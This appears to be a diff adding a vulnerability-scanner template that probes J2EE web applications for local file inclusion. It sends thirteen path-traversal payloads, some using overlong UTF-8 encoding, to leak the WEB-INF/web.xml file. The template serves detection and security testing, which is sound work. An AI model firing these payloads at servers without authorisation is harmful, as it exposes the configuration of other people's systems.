@@ -1,0 +1,53 @@
+id: generic-j2ee-lfi
+
+info:
+  name: Generic J2EE LFI Scan Panel - Detect
+  author: davidfegyver
+  severity: high
+  description: Generic J2EE Scan panel was detected. Looks for J2EE specific LFI vulnerabilities; tries to leak the web.xml file.
+  reference:
+    - https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/LFIModule.java
+    - https://gist.github.com/harisec/519dc6b45c6b594908c37d9ac19edbc3
+  classification:
+    cwe-id: CWE-23,CWE-73
+  metadata:
+    verified: true
+    max-request: 13
+    shodan-query: http.title:"J2EE"
+  tags: lfi,generic,j2ee,vuln
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{paths}}"
+    payloads:
+      paths:
+        - "/../../../../WEB-INF/web.xml"
+        - "/../../../WEB-INF/web.xml"
+        - "/../../WEB-INF/web.xml"
+        - "/%c0%ae/%c0%ae/WEB-INF/web.xml"
+        - "/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml"
+        - "/%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml"
+        - "/../../../WEB-INF/web.xml;x="
+        - "/../../WEB-INF/web.xml;x="
+        - "/../WEB-INF/web.xml;x="
+        - "/WEB-INF/web.xml"
+        - "/.//WEB-INF/web.xml"
+        - "/../WEB-INF/web.xml"
+        - "/%c0%ae/WEB-INF/web.xml"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<servlet-name>"
+          - "</web-app>"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502210084df97c31856cab8157eea242482fd78c82c95e8877313aea8198b70bef5f52802203ec36471693b7ccb85323e4758d0a2da2c662816d651366c890e2f655cc9d50c:922c64590222798bb761d5b6d8e72950
